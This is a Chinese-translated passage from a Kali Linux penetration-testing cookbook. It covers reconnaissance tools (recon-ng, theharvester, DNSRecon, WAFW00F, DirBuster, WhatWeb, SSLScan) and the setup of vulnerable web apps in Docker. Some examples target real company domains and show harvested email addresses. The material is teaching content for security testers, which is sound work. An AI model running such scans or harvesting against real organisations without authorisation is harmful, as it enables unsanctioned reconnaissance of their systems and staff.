在这个教程中，我们将看到在开始使用 recon-ng 之前，我们需要设置 API 秘钥。Recon-ng 是最强大的信息收集工具之一；如果使用正确，它可以帮助渗透测试人员从公共来源收集相当多的信息。最新版本的 recon-ng 提供了灵活性，可以将其设置为各种社交网络网站中的自己的应用程序/客户端。

## 准备工作

对于这个教程，您需要一个互联网连接和一个网络浏览器。

## 如何操作...

1.  要设置 recon-ng API 秘钥，打开终端，启动 recon-ng，并输入以下截图中显示的命令：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_001.jpg)

1.  接下来，输入`keys list`，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_002.jpg)

1.  让我们首先添加`twitter_api`和`twitter_secret`。登录 Twitter，转到[`apps.twitter.com/`](https://apps.twitter.com/)，并创建一个新的应用程序，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_003.jpg)

1.  点击**创建应用程序**；一旦应用程序创建完成，转到**Keys and Access Tokens**选项卡，并复制秘钥和 API 秘钥，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_004.jpg)

1.  复制 API 秘钥，重新打开终端窗口，并运行以下命令以添加秘钥：

```
Keys add twitter_api <your-copied-api-key>

```

1.  现在使用以下命令输入`twitter_secret`到 recon-ng 中：

```
keys add  twitter_secret <you_twitter_secret>

```

1.  添加了秘钥后，您可以通过输入以下命令在 recon-ng 工具中看到添加的秘钥：

```
keys list

```

1.  现在，让我们添加 Shodan API 秘钥。添加 Shodan API 秘钥非常简单；你只需要在[`shodan.io`](https://shodan.io)创建一个帐户，然后点击右上角的**My Account**。您将看到**Account Overview**页面，在那里您可以看到一个 QR 码图像和 API 秘钥，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_005.jpg)

1.  复制您帐户中显示的 API 秘钥，并使用以下命令将其添加到 recon-ng 中：

```
keys add shodan_api <apikey>

```

## 它是如何工作的...

在这个教程中，我们学习了如何将 API 秘钥添加到 recon-ng 工具中。在这里，为了演示这一点，我们创建了一个 Twitter 应用程序，使用了`twitter_api`和`twitter_secret`，并将它们添加到了 recon-ng 工具中。结果如下截图所示：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_006.jpg)

类似地，如果您想要从这些来源收集信息，您需要在 recon-ng 中包含所有的 API 秘钥。

在下一个教程中，我们将学习如何使用 recon-ng 进行信息收集。

# 使用 recon-ng 进行侦察

在这个教程中，我们将学习使用 recon-ng 进行侦察。Recon-ng 是一个用 Python 编写的全功能 Web 侦察框架。具有独立模块、数据库交互、内置便利函数、交互式帮助和命令完成，recon-ng 提供了一个强大的环境，可以快速而彻底地进行开源基于 Web 的侦察。

## 准备工作

在安装 Kali Linux 之前，您需要一个互联网连接。

## 操作步骤...

1.  打开终端并启动 recon-ng 框架，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_007.jpg)

1.  Recon-ng 看起来和感觉像 Metasploit。要查看所有可用的模块，请输入以下命令：

```
show modules

```

1.  Recon-ng 将列出所有可用的模块，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_008.jpg)

1.  让我们继续使用我们的第一个信息收集模块；输入以下命令：

```
use recon/domains-vulnerabilities/punkspider

```

1.  现在，输入以下屏幕截图中显示的命令：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_009.jpg)

1.  如您所见，已经发现了一些漏洞，并且它们是公开可用的。

1.  让我们使用另一个模块，从[xssed.com](http://xssed.com/)获取任何已知和报告的漏洞。XSSed 项目由 KF 和 DP 于 2007 年 2 月初创建。它提供有关跨站脚本漏洞相关的所有信息，并且是最大的 XSS 易受攻击网站的在线存档。这是一个收集 XSS 信息的良好存储库。首先，输入以下命令：

```
      Show module
      use recon/domains-vulnerabilities/xssed
      Show Options
      Set source Microsoft.com
      Show Options
      RUN

```

您将看到以下屏幕截图中显示的输出：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_010.jpg)

1.  如您所见，recon-ng 已经从 XSSed 汇总了公开可用的漏洞，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_011.jpg)

1.  同样，您可以继续使用不同的模块，直到获得有关目标的所需信息。

# 使用 theharvester 收集信息

在这个教程中，我们将学习使用 theharvester。该程序的目标是从不同的公共来源（如搜索引擎、PGP 密钥服务器和 Shodan 计算机数据库）收集电子邮件、子域、主机、员工姓名、开放端口和横幅。

## 准备工作

对于这个教程，您需要一个互联网连接。

## 操作步骤...

1.  打开终端并启动 theharvester，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_012.jpg)

1.  theharvester 帮助还显示了示例语法。为了演示目的，我们将使用以下命令：

```
# theharvester -d visa.com -l 500 -b all

```

1.  成功执行上述命令将给出以下信息：

```
*******************************************************************
    *                                                                 *    * | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
 * | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
 * | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
 *  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
 *                                                                 *
    * TheHarvester Ver. 2.5                                           *
    * Coded by Christian Martorella                                   *
    * Edge-Security Research                                          *
    * cmartorella@edge-security.com                                   *
    *******************************************************************
Full harvest..
[-] Searching in Google..
 Searching 0 results...
 Searching 100 results...
 Searching 200 results...
[-] Searching in PGP Key server..
[-] Searching in Bing..
 Searching 50 results...
 Searching 100 results...
 ...
[-] Searching in Exalead..
 Searching 50 results...
 Searching 100 results...
 ...
[+] Emails found:
------------------
phishing@visa.com
vpp@visa.com
v@e-visa.com
...
[+] Hosts found in search engines:
------------------------------------
[-] Resolving hostnames IPs... 
23.57.249.100:usa.visa.com
23.57.249.100:www.visa.com
...
[+] Virtual hosts:
==================
50.56.17.39  jobs.<strong>visa<
50.56.17.39  jobs.visa.com
...

```

## 工作原理...

在这个教程中，theharvester 搜索不同的来源，如搜索引擎、PGP 密钥服务器和 Shodan 计算机数据库，以获取信息。对于想要了解攻击者可以看到有关其组织的信息的任何人来说，这也是有用的。您可以访问[`tools.kali.org/information-gathering/theharvester`](http://tools.kali.org/information-gathering/theharvester)获取更多信息，如项目主页和 GitHub 代码存储库。

在第 2 步中，`-d`代表域，`-l`限制结果的数量，`-b`代表数据源。在我们的情况下，我们有`-b`作为查找电子邮件和数据源中可用的公共主机的手段。

# 使用 DNS 协议进行信息收集

在这个教程中，我们将学习使用各种可用的工具/脚本来收集有关您的 Web 应用程序域的信息。**DNS**代表**域名系统**，如果您正在执行黑盒测试，它可以为您提供大量信息。

## 准备工作

对于这个教程，您需要一个互联网连接。

## 操作步骤...

1.  我们将使用 DNSenum 进行 DNS 枚举。要开始 DNS 枚举，打开终端并输入以下命令：

```
dnsenum --enum zonetransfer.me

```

1.  我们应该得到一些信息，比如主机、域名服务器、电子邮件服务器，如果幸运的话，还有区域传输：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_013.jpg)

1.  接下来，DNSRecon 工具也可以在 Kali Linux 中使用。DNSRecon 通常是首选的选择，因为它更可靠，结果被正确解析，并且可以轻松地导入到其他漏洞评估和利用工具中。

1.  要使用 DNSRecon，请打开终端并输入以下命令：

```
      dnsrecon -d zonetransfer.me -D /usr/share/wordlists/dnsmap.txt      -t std --xml dnsrecon.xml

```

1.  枚举结果输出如下：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_014.jpg)

## 它是如何工作的...

在这个教程中，我们使用了 DNSenum 来枚举各种 DNS 记录，如 NS、MX、SOA 和 PTR 记录。DNSenum 还尝试执行 DNS 区域传输，如果存在漏洞。然而，DNSRecon 是一个更强大的 DNS 工具。它具有高度可靠的、更好的结果解析和更好的结果集成到其他 VA/利用工具中。

在第 4 步，使用`-d`命令进行域扫描开关，大写`-D`用于对主机名执行字典暴力破解，`-D`的参数应指向一个单词列表，例如`/usr/share/wordlists/dnsmap.txt`，为了指定这是一个标准扫描，我们使用了（`-t std`）开关，并将输出保存到一个文件（`-xml dnsrecon.xml`）。

## 还有更多...

Kali Linux 中有多个可用的脚本，其中一些脚本或多或少地执行相同的操作。根据您的评估类型和可用时间，您应该考虑使用以下 DNS 工具：

+   **DNSMap**：DNSmap 主要用于渗透测试人员在基础设施安全评估的信息收集/枚举阶段使用。在枚举阶段，安全顾问通常会发现目标公司的 IP 网络块、域名、电话号码等。

+   **DNSTracer**：这确定给定 DNS 从哪里获取其信息，并跟踪 DNS 服务器链返回到知道数据的服务器。

+   **Fierce**：这是专门用于定位可能的目标，无论是在公司网络内还是外部。只列出那些目标（除非使用`-nopattern`开关）。不执行利用（除非您使用`-connect`开关故意进行恶意操作）。Fierce 是一种侦察工具。Fierce 是一个 Perl 脚本，可以使用多种策略快速扫描域（通常只需几分钟，假设没有网络延迟）。

# Web 应用程序防火墙检测

在这个教程中，我们将学习使用一个名为**WAFW00F**的工具。WAFW00F 可以识别和指纹**Web 应用程序防火墙**（**WAF**）产品。

## 准备工作

对于这个教程，您需要一个互联网连接。

## 如何操作...

1.  WAFW00F 非常简单易用。只需打开终端并输入以下命令：

```
wafw00f https://www.microsoft.com

```

输出将如下截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_015.jpg)

1.  同样，您可以不断更改目标域以查找 Web 应用程序防火墙的存在。

## 它是如何工作的...

在这个教程中，我们使用了 WAFW00F 来识别是否有任何 Web 应用程序防火墙正在运行。准确检测 Web 应用程序防火墙可以帮助您在渗透测试期间节省大量时间。

WAFW00F 的工作方式如下：

+   它发送一个正常的 HTTP 请求并分析响应；这可以识别多个 WAF 解决方案

+   如果不成功，它会发送一些（可能恶意的）HTTP 请求，并使用简单的逻辑来推断是哪种 WAF

+   如果这也不成功，它会分析先前返回的响应，并使用另一个简单的算法来猜测是否有 WAF 或安全解决方案正在积极响应我们的攻击

有关更多详细信息，请查看主站点上的源代码，[github.com/sandrogauci/wafw00f](http://github.com/sandrogauci/wafw00f)。

# HTTP 和 DNS 负载均衡器检测

在这个示例中，我们将学习如何使用 lbd 检测 HTTP 和 DNS 负载均衡器。**Lbd**（**负载均衡检测器**）检测给定域名是否使用 DNS 和/或 HTTP 负载均衡（通过服务器和日期：标头以及服务器响应之间的差异）。

## 准备工作

对于这个示例，您需要一个互联网连接。

## 如何操作...

1.  打开终端并输入以下命令：

```
lbd google.com

```

1.  成功检测到 HTTP 和 DNS 负载均衡器将产生以下输出：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_016.jpg)

1.  另一个例子是检测到 DNS 负载均衡器和 HTTP 负载均衡器，如下截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_017.jpg)

1.  需要在这里理解的一件事是，lbd 并不完全可靠；它只是一个检查负载均衡是否完成的概念验证。您可以在终端上阅读到它可能产生误报，但这是一个很棒的工具。![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_018.jpg)

1.  另一个可以帮助我们了解 DNS 负载均衡器是否真的存在的工具是 dig 工具。让我们更详细地看一下；输入以下命令：

```
dig A google.com

```

输出将如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_019.jpg)

1.  `ANSWER SECTION`显示了[microsoft.com](http://microsoft.com)的不同基于 DNS 的负载均衡器。用于测试基于 HTTP 的负载均衡器的工具是 Halberd。为了检查 Halberd 的工作原理，请在 Kali 终端中输入以下内容：

```
halberd http://www.vmware.com

```

输出将如下截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_020.jpg)

## 工作原理...

在这个示例中，我们使用 lbd 来查找 DNS 和 HTTP 负载均衡器。在渗透测试的早期阶段获得这些信息可以节省很多时间，因为您可以选择适当的工具和方法，找到 Web 应用程序安全问题。

这个命令`lbd kali.org`非常简单。Ldb 是工具名称，它接受一个参数，即需要检查的域名或 IP 名称。前述工具的工作原理如下所述：

+   **Lbd**：这个工具基于两个参数进行负载均衡：DNS 和 HTTP。对于 DNS，它通常使用轮询技术来确定是否存在多个负载均衡器。对于 HTTP，负载均衡是通过 cookies 进行检查；它通过会话状态检查不同的请求是否由负载均衡器后面实际的服务器发送和接收。另一种 HTTP 方法是时间戳；它试图检测时间戳的差异，以帮助我们检测是否存在负载均衡器。在前述例子中，我们看到负载均衡器是基于内容长度区分的。

+   **DIG**：这代表**Domain Information Groper**，是一个枚举给定域的详细信息的 Linux 命令。我们使用 A 记录来检查 groper 上可用的 DNS 服务器，以确定是否存在基于 DNS 的负载均衡器。多个 A 记录条目通常表明存在 DNS 负载均衡器。

+   **Halberd**：这是一个基于 HTTP 的负载均衡器检测器。它检查 HTTP 响应头、cookies、时间戳等的差异。在上述参数中的任何差异都将证明存在基于 HTTP 的负载均衡器。在前面的例子中，我们检查 VMware 上是否存在基于 HTTP 的负载均衡器，如果我们发现检测到两个不同的实例，一个具有 Akamai 标头，另一个没有相同的标头。

# 使用 DirBuster 发现隐藏文件/目录

在这个示例中，我们将学习如何使用 DirBuster 工具。DirBuster 工具查找 Web 服务器上的隐藏目录和文件。有时，开发人员会留下一个可访问但未链接的页面；DirBuster 旨在找到这些可能存在潜在漏洞的文件。这是一个由 OWASP 的出色贡献者开发的基于 Java 的应用程序。

## 准备工作

对于这个步骤，您需要一个互联网连接。

## 如何操作...

1.  从**Kali Linux** | **Web 应用程序分析** | **Web 爬虫和目录暴力** | **Dirbuster**启动 DirBuster，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_021.jpg)

1.  打开 DirBuster 并输入您的目标 URL；在我们的案例中，我们将输入`http://demo.testfire.net`以进行演示，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_022.jpg)

1.  基于选择列表的暴力破解。浏览并导航到`/usr/share/dirbuster/wordlists`，然后选择`directory_list_medium.txt`，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_023.jpg)

1.  单击**选择列表**并在文件扩展名列中输入`php`（根据目标使用的技术），如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_024.jpg)

1.  单击**开始**，DirBuster 将开始暴力破解目录和文件，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_025.jpg)

1.  正如您所看到的，DirBuster 已经开始暴力破解文件和目录。您可以单击**响应**列以对所有具有**200** HTTP 代码的文件/文件夹进行排序，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_026.jpg)

1.  现在，您可以花一些时间访问这些链接，并调查哪些看起来有趣并且可以用于进一步攻击。例如，在我们的案例文件中，`/pr/docs.xml`文件似乎是独立的文件，位于服务器上，没有在站点地图或`robots.txt`文件中提到。右键单击该条目，然后选择**在浏览器中打开**，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_027.jpg)

1.  文件已在浏览器中打开；正如您所看到的，这是一个 XML 文件，本来不应该是公共文件，它在应用程序中也没有链接，但是可以访问，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_028.jpg)

1.  同样，您可以继续调查其他文件和文件夹，这些文件和文件夹可能泄露大量信息，或者一些备份文件或开发页面，这些可能存在漏洞。

## 工作原理...

在这个步骤中，我们使用了 DirBuster 来查找 Web 服务器上可用的隐藏目录和文件。DirBuster 生成了一个包含最常见 Web 服务器目录的字典文件，并从字典中读取值并向 Web 服务器发出请求以检查其存在。如果服务器返回 200 HTTP 头代码，这意味着该目录存在；如果服务器返回 404 HTTP 头代码，这意味着该目录不存在。但是，重要的是要注意，401 和 403 的 HTTP 状态代码也可能指向文件或目录的存在，但除非经过身份验证，否则不允许打开。

与此同时，一些构建良好的应用程序也会对未知文件和文件夹返回 200 OK，以干扰 DirBuster 等工具。因此，了解应用程序的行为方式非常重要，基于这一点，您可以进一步调整您的扫描策略和配置。

通过这种方式，我们能够找到某些未在应用程序中链接但在 Web 服务器上可用的文件和文件夹。

# 使用 WhatWeb 和 p0f 进行 CMS 和插件检测

在这个步骤中，我们将学习如何使用 Kali 中提供的不同工具，这些工具可以用来确定已安装的插件。如果应用程序是基于 CMS 构建的，那么它们很可能会使用某些插件。通常存在的主要漏洞通常是开发人员在这些 CMS 中使用的第三方插件。查找已安装的插件及其版本可以帮助您寻找可用于易受攻击插件的漏洞利用。

## 准备工作

对于这个步骤，您需要一个互联网连接。

## 如何操作...

1.  让我们从 Kali Linux 中的第一个工具**WhatWeb**开始。WhatWeb 用于识别网站。它的目标是回答问题：“那是什么网站？”WhatWeb 可以识别 Web 技术，包括**内容管理系统**（**CMS**）、博客平台、统计/分析软件包、JavaScript 库、Web 服务器和嵌入式设备。WhatWeb 有超过 900 个插件，每个插件用于识别不同的东西。WhatWeb 还可以识别版本号、电子邮件地址、帐户 ID、Web 框架模块、SQL 错误等。WhatWeb 非常易于使用。打开终端并输入以下命令：

```
whatweb ishangirdhar.com

```

输出如下屏幕截图所示：

![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_029.jpg)

1.  如您所见，它非常准确地发现了这是一个 WordPress 安装。它还检测到了 DNS 和 HTTP 负载均衡器使用的常见插件。

1.  假设您已经发现您的一个目标正在使用 WordPress 或 Drupal 作为 CMS，并且您想进一步查找已安装的插件、它们的版本以及该插件的最新可用版本。

1.  Plecost 是 Kali 中另一个流行的工具，用于检测 CMS 插件和 WordPress 指纹识别。

1.  打开终端并输入以下命令：

```
      plecost -n 100 -s 10 -M 15 -i /usr/share/plecost      /wp_plugin_list.txt ishangirdhar.com

```

这个语法意味着使用 100 个插件（`-n 100`），在探测之间休眠 10 秒（`-s 10`），但不超过 15 个（`-M 15`），并使用插件列表（`-i /usr/share/plecost/wp_plugin_list.txt`）来扫描给定的 URL（`ishangirdhar.com`）。

## 工作原理...

在这个教程中，我们学会了使用 WhatWeb，它可以非常准确地对服务器进行指纹识别，并提供 CMS、插件、Web 服务器版本、使用的编程语言以及 HTTP 和 DNS 负载均衡器的详细信息。在本教程的后面，我们还学会了使用 plecost 来扫描 WordPress 安装以对已安装的 WordPress 插件进行指纹识别。

大多数 WhatWeb 插件都非常全面，可以识别从微妙到明显的各种线索。例如，大多数 WordPress 网站可以通过 meta HTML 标签进行识别，但少数 WordPress 网站会删除这个标识标签，尽管这并不会阻止 WhatWeb。WordPress WhatWeb 插件有超过 15 个测试，包括检查 favicon、默认安装文件、登录页面，并检查相对链接中是否包含`/wp-content/`。

WordPress 指纹识别工具**plecost**，可以搜索并检索运行 WordPress 的服务器上关于插件及其版本的信息。它可以分析单个 URL，也可以根据 Google 索引的结果进行分析。此外，它还显示与每个插件相关的 CVE 代码（如果有的话）。Plecost 检索包含在 WordPress 支持的网站上的信息，并且还允许在 Google 索引的结果上进行搜索。

## 还有更多...

除了我们刚刚看到的之外，还有其他可用的工具。例如，用于扫描 WordPress、Drupal 和 Joomla 的工具如下：

+   **WpScan**: [`wpscan.org/`](http://wpscan.org/)

+   **DrupalScan**: [`github.com/rverton/DrupalScan`](https://github.com/rverton/DrupalScan)

+   **Joomscan**: [`sourceforge.net/projects/joomscan/`](http://sourceforge.net/projects/joomscan/)

# 查找 SSL 密码漏洞

在这个教程中，我们将学习使用工具来扫描易受攻击的 SSL 密码和与 SSL 相关的漏洞。

## 准备工作

对于这个教程，您需要一个互联网连接。

## 如何操作...

1.  打开终端并启动 SSLScan 工具，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_030.jpg)

1.  要使用 SSLScan 扫描目标，请运行以下命令：

```
sslscan demo.testfire.net

```

1.  SSLScan 将测试 SSL 证书支持的所有密码。弱密码将显示为红色和黄色。强密码将显示为绿色：

```
root@Intrusion-Exploitation:~# sslscan demo.testfire.net
Version: -static
OpenSSL 1.0.1m-dev xx XXX xxxx
Testing SSL server demo.testfire.net on port 443
 TLS renegotiation:
Secure session renegotiation supported
 TLS Compression:
Compression disabled
 Heartbleed:
TLS 1.0 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.2 not vulnerable to heartbleed
 Supported Server Cipher(s):
Accepted  SSLv3    128 bits  RC4-SHA
Accepted  SSLv3    128 bits  RC4-MD5
Accepted  SSLv3    112 bits  DES-CBC3-SHA
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA
Accepted  TLSv1.0  256 bits  AES256-SHA
Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA
Accepted  TLSv1.0  128 bits  AES128-SHA
Accepted  TLSv1.0  128 bits  RC4-SHA
Accepted  TLSv1.0  128 bits  RC4-MD5
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA
Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA
Accepted  TLSv1.1  256 bits  AES256-SHA
Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA
Accepted  TLSv1.1  128 bits  AES128-SHA
Accepted  TLSv1.1  128 bits  RC4-SHA
Accepted  TLSv1.1  128 bits  RC4-MD5
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA
Accepted  TLSv1.2  256 bits  AES256-SHA256
Accepted  TLSv1.2  256 bits  AES256-SHA
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA
Accepted  TLSv1.2  128 bits  AES128-SHA256
Accepted  TLSv1.2  128 bits  AES128-SHA
Accepted  TLSv1.2  128 bits  RC4-SHA
Accepted  TLSv1.2  128 bits  RC4-MD5
Accepted  TLSv1.2  112 bits  DES-CBC3-SHA
 Preferred Server Cipher(s):
SSLv3    128 bits  RC4-SHA
TLSv1.0  128 bits  AES128-SHA
TLSv1.1  128 bits  AES128-SHA
TLSv1.2  128 bits  AES128-SHA256
 SSL Certificate:
Signature Algorithm: sha1WithRSA
RSA Key Strength:    2048
Subject:  demo.testfire.net
Issuer:   demo.testfire.net
root@Intrusion-Exploitation:~# D

```

1.  我们的下一个工具是 SSLyze，由 iSEC Partners 开发。

1.  打开终端并调用 SSLyze 帮助，如下面的屏幕截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_031.jpg)

1.  要测试一个域的支持密码的全面列表，请在终端中输入以下命令：

```
sslyze -regular demo.testfire.net

```

1.  如果服务器在端口`443`上运行 SSL，输出应该像这样：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_032.jpg)

1.  这个教程中的最后一个工具是 TLSSLed。打开终端并调用该工具，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_05_033.jpg)

1.  现在使用以下命令启动 TLSSLed：

```
root@Intrusion-Exploitation:~# tlssled demo.testfire.net 443

```

1.  TLSSEled 还显示了所有的 cookie，其中是否设置了安全和 HttpOnly 标志，这在以后利用 XSS 攻击应用程序时可能是有用的信息。

## 工作原理...

在这个教程中，我们使用了三种工具来扫描目标域上的 SSL 证书，以查找弱密码和 SSL 漏洞，比如 Heartbleed。这些工具中的每一个都有它们独特的信息表示方式。SSLScan 试图检查目标是否容易受到 Heartbleed 的攻击，同时还会扫描弱密码。SSLyze 专注于速度，并且还支持 SMTP、XMPP、LDAP、POP、IMAP、RDP 和 FTP 协议上的 StartTLS 握手。TLSSLed 是一个使用 SSLScan 创建的工具，但它提供了更多信息。

SSLyze 是一个 Python 工具，可以通过连接到服务器来分析服务器的 SSL 配置。它旨在快速全面，应该有助于组织和测试人员识别影响其 SSL 服务器的错误配置。SSLyze 由 iSEC Partners 开发。

TLSSLed 是一个 Linux shell 脚本，其目的是评估目标 SSL/TLS（HTTPS）Web 服务器实现的安全性。它基于 SSLScan，这是一个基于 OpenSSL 库和`openssl s_client`命令行工具的彻底的 SSL/TLS 扫描程序。当前的测试包括检查目标是否支持 SSLv2 协议，空密码，以及基于密钥长度（40 或 56 位）的弱密码，强密码的可用性（如 AES），数字证书是否是 MD5 签名的，以及当前的 SSL/TLS 重新协商能力。

偶尔，您还应该彻底查看证书错误。您还可以根据证书错误发现属于同一组织的相关域和子域，因为有时组织会为不同的域购买 SSL 证书，但会重用它们，这也会导致无效的证书名称错误。


# 第六章. Web 应用程序漏洞评估

在本章中，我们将涵盖以下内容：

+   在 Docker 中运行易受攻击的 Web 应用程序

+   使用 w3af 进行漏洞评估

+   使用 Nikto 进行 Web 服务器评估

+   使用 Skipfish 进行漏洞评估

+   使用 Burp Proxy 拦截 HTTP 流量

+   使用 Burp Intruder 进行定制攻击自动化

+   使用 Burp Sequencer 检查会话随机性

# 介绍

漏洞评估阶段是在目标机器上查找漏洞的过程。

同时在 Web 应用程序和网络上执行漏洞评估可能更有用，因为您将能够将来自网络基础设施和其他协议（如 SSH、telnet、数据库、SNMP、SMB 和 FTP）的不同漏洞和信息相关起来。这将让您更好地了解特定 Web 应用程序的目的及其在组织内的用途。

然而，为了让观众更容易理解，我们将专门介绍在 Web 应用程序上执行漏洞评估所需的工具和技术。本章的配方结构旨在使您能够在一个地方找到扫描和定位 Web 应用程序中所需的所有工具和技术。

漏洞评估阶段就像一个准备阶段，在这个阶段我们将找到漏洞。为了确保我们找到应用程序中所有可能的漏洞，必须进行全面的测试。然而，有时使用自动化扫描工具会产生误报。为了成功进行渗透测试，非常重要的是我们使用手动漏洞评估方法去除所有误报。

### 注意

不要对不是您自己的公共网站或不在您自己服务器上的网站运行本章演示的工具。在这种情况下，我们在云上设置了三个易受攻击的 Web 应用程序，以演示本章中的工具/技术。*小心！*

这些 Web 应用程序是 OWASP 砖块、Damn Vulnerable Web Application (DVWA)和 WordPress Version 2.2 (易受攻击!)。

这些应用程序是有意设计成易受攻击的，因此我们不建议您直接在服务器上甚至在本地桌面/笔记本电脑上安装这些 Web 应用程序。为了演示目的，我们已经在一个 Docker 容器中安装了这三个易受攻击的 Web 应用程序，并将其托管在 Docker hub 上供您拉取和使用。查看下一个配方。

# 在 Docker 中运行易受攻击的 Web 应用程序

在上一个配方中，我们下载了 Docker 并运行了一个 hello-world 示例容器。在这个配方中，我们将下载一个我们为您准备好的 Docker 容器，供您下载和使用。这是一个已经配置好并准备好使用的容器，其中包含三个易受攻击的 Web 应用程序：

+   OWASP 砖块

+   Damn Vulnerable Web Applications

+   WordPress 2.2 (易受攻击!)

## 准备工作

要完成此配方，您需要在 Oracle Virtualbox 或 VMware 上运行 Kali Linux 并连接到互联网。这个配方与前一个配方密切相关；强烈建议您在继续本配方之前先遵循前一个配方。如果您的 Kali 上已经安装了 Docker，您可以直接开始本配方。

## 操作步骤...

对于这个配方，您需要执行以下步骤：

1.  打开终端并拉取 Docker 容器镜像，如下命令所示：

```
$ docker pull intrusionexploitation/dvwa-wordpress2.2-bricks

```

1.  您将看到不同的层被下载，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_001.jpg)

1.  成功下载容器镜像后，您将看到类似于以下截图的屏幕：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_002.jpg)

1.  现在，使用以下命令运行已下载的 Docker 容器镜像：

```
docker run --name intrusionexploitation       intrusionexploitation/dvwa-wordpress2.2-bricks

```

1.  运行上述命令后，您将看到以下输出：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_003.jpg)

1.  如果您看到相同的输出，这意味着您的 Docker 容器正在运行。保持此终端运行，不要关闭它，也不要按*Ctrl* + *C*。按*Ctrl* + *C*将停止运行的容器；现在，保持它运行并最小化终端，以免意外关闭它。

1.  要查看安装在此容器上的易受攻击的 Web 应用程序，您首先需要找出正在运行的容器的当前 IP 地址。

